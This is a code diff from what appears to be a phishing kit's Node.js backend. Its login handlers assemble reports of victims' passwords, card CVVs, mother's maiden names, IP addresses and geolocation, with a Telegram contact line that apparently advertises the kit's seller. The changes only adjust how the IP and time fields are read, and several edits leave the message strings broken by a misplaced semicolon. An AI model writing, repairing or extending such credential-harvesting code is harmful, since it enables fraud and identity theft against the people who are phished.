@@ -105,7 +105,7 @@ exports.loginPost2 = async (req, res) => {
 			`PASSWORD         : ${password}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
+           `IP ADDRESS       : ${ipAddress}\n` +
             `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
             `💬 Telegram: https://t.me/UpdateTeams\n` +
             `🌐 Website: Coming soon!!\n`;
@@ -165,7 +165,7 @@ const sendAPIRequest = async (ipAddress) => {
 		`CVV              : ${cvv}\n\n` +
 		`🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n\n` + 
+		 `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 		
@@ -207,7 +207,7 @@ exports.loginPost4 = async (req, res) => {
 		`MMN              : ${mmn}\n\n` +
 		`🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n\n` + 
+		 `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 		
